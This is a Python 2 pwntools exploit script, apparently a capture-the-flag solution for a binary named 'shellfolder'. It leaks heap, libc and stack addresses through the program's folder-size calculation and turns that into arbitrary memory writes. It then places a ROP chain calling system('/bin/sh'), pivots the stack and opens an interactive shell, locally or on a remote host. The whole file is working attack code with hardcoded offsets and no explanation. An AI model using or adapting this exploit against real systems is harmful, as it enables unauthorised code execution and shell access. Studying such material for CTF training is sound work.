#!/usr/bin/env python2
# -*- coding:utf-8 -*-
from pwn import *
import os, sys

# switches
DEBUG = 1 

# modify this
if DEBUG:
    io = process('./shellfolder')
else:
    io = remote(sys.argv[1], sys.argv[2])

#if DEBUG: context(log_level='debug')

# simplified r/s function
def ru(delim):
    return io.recvuntil(delim)

def rn(count):
    return io.recvn(count)

def ra(count):      # recv all
    buf = ''
    while count:
        tmp = io.recvn(count)
        buf += tmp
        count -= len(tmp)
    return buf

def sl(data):
    return io.sendline(data)

def sn(data):
    return io.send(data)

def info(string):
    return log.info(string)

def dehex(s):
    return s.replace(' ','').decode('hex')

'''
  puts("**************************************");
  puts("            ShellingFolder            ");
  puts("**************************************");
  puts(" 1.List the current folder            ");
  puts(" 2.Change the current folder          ");
  puts(" 3.Make a folder                      ");
  puts(" 4.Create a file in current folder    ");
  puts(" 5.Remove a folder or a file          ");
  puts(" 6.Caculate the size of folder        ");
  puts(" 7.Exit                               ");
  puts("**************************************");
'''
# define symbols and offsets here
g_ga = 'a'
old_last_size = 0 

# define interactive functions here
def create_folder(name):
	ru('choice:')
	sl('3')	
	ru('Folder:')
	sl(name)

def create_file(name, size = 0):
	ru('choice:')
	sl('4')
	ru('File:')
	sl(name[:30])
	ru('File:')
	sl(str(u32(p32(size))))
	ru('successful\n')

def cal_size():
	ru('choice:')
	sl('6')

def rm_folder(name):
	ru('choice:')
	sl('5')
	ru('file :')
	sl(name)
	
def add_pre(root, addr, is_hi, old_n):
	global g_ga
	filename = g_ga * 24 + p64(root)
	g_ga = chr(ord(g_ga) + 1)
	
	if is_hi:
		addr = (addr >> 32)
		old = (old_n >> 32)
		size = addr - old
		old_n = (addr << 32) | (old_n & 0xffffffff)
	else:	
		neg = False
		old = old_n & 0xffffffff
		addr = addr & 0xffffffff
		if addr < old:
			#same as addr_high - 1)
			old += 0x100000000

		size = addr - old

		if size > 0x7fffffff:
			neg = True

	 	old_n = (((old_n >> 32) - (1 if neg else 0)) << 32) | (addr & 0xffffffff)

	size = size & 0xffffffff
	create_file(filename, size = size)
	return filename[:filename.index('\x00')], old_n

def leak_addr(root, addr):
	global old_last_size
	addr -= 88
	f1, old_last_size = add_pre(root + 9 * 8, addr, False, old_last_size)
	print hex(old_last_size)
	f2, old_last_size = add_pre(root + 9 * 8 + 4, addr, True, old_last_size)
	print hex(old_last_size)
	old_last_size = addr
	
	cal_size()
	
	#leak with the list func
	ru('choice:')
	sl('1')
	ru('EEEE')
	ru('\n')
	leaked = ru('\n')	
	if "[32m" in leaked:
		leaked = u64(leaked[5: 11].ljust(8, '\x00'))
	else: 
		leaked = u64(leaked[:6].ljust(8, '\x00'))
	info(hex(leaked))
	#clean up
	rm_folder(f1)
	rm_folder(f2)
	return leaked		

old_write_addr = 0
def write(addr, val, exploit = False):
	global old_write_addr
	f1, old_write_addr = add_pre(addr, val, False, old_write_addr)
	f2, old_write_addr = add_pre(addr + 4, val, True, old_write_addr)
	old_write_addr = val
	
	
	if exploit:
		pause()
		cal_size()
		ru('The size of the folder is')
		ru('\n')
		return 
	
	cal_size()	
	
	rm_folder(f1)
	rm_folder(f2)

def leak_heap():
	create_file('b' * 24)
	ru('choice:')
	sl('6')
	ru('b' * 24)
	heap_addr = u64(ru(' : size')[:-7].ljust(8, '\x00'))
	rm_folder('b' * 24)
	return heap_addr	

# define exploit function here
def pwn():
	heap_addr = leak_heap()
	info('heap_addr : ' + hex(heap_addr))
	root_folder = heap_addr - 0x78
	heap_base = root_folder - 0x10
	info('root_folder : ' + hex(root_folder))
	info('heap_base : ' + hex(heap_base))
	
	#try to leak an address in libc
	create_folder('AAAA')
	create_folder('BBBB')
	create_folder('CCCC')
	create_folder('DDDD')
	create_folder('EEEE')
	rm_folder('DDDD')
	rm_folder('BBBB')	
	rm_folder('AAAA')
	
	leaked_libc = leak_addr(root_folder, heap_base + 0x130)
	info('leaked_libc : ' + hex(leaked_libc))
	libc_base = leaked_libc - 3951704
	info('libc_base : ' + hex(libc_base))
	
	environ_addr = libc_base + 0x3c7218
	environ_stack = leak_addr(root_folder, environ_addr)		
	info('environ_stack : ' + hex(environ_stack))
	hlt_addr = leak_addr(root_folder, environ_stack - 0x30)
	info('hlt_addr : ' + hex(hlt_addr))
	bin_base = hlt_addr - 0xac9
	func_ret = environ_stack - 240 - 0x20
	info('bin_base : ' + hex(bin_base))
	info('func_ret : ' + hex(func_ret))	

	system_addr = libc_base + 279504
	stack_pivot = libc_base + 0x000000000008e6fe
	poprdi = libc_base + 0x218a2
	binsh_addr = libc_base + 1623005
	chain = [poprdi, binsh_addr, system_addr]
	leak_addr(root_folder, func_ret + 0x100 + 16)
	
	#write addr to ret_addr
	global old_write_addr

	for idx,addr in enumerate(range(func_ret + 0x100 + 8, func_ret + 0x100 + 8 + 8 * len(chain), 8)):
		
		if idx == 0:
			old_write_addr = 0
		else:
			buf = []
			old_write_addr = leak_addr(root_folder, addr)
			print hex(old_write_addr)
	
		print '[i] writing %#x to %#x (old value %#x)' % (chain[idx], addr, old_write_addr)
		write(addr, chain[idx])
	
	old_write_addr = bin_base + 0x1669
	info('old_write_addr : ' + hex(old_write_addr))
	# now overwrite the return address of the "calculate size" function itself, so
	# that it will pivot the stack and start executing the ROP chain we created before.
	print '[i] writing %#x to %#x (old value %#x)' % (stack_pivot, func_ret, old_write_addr)
	write(func_ret, stack_pivot, True)
	
	io.interactive()

if __name__ == '__main__':
    pwn()
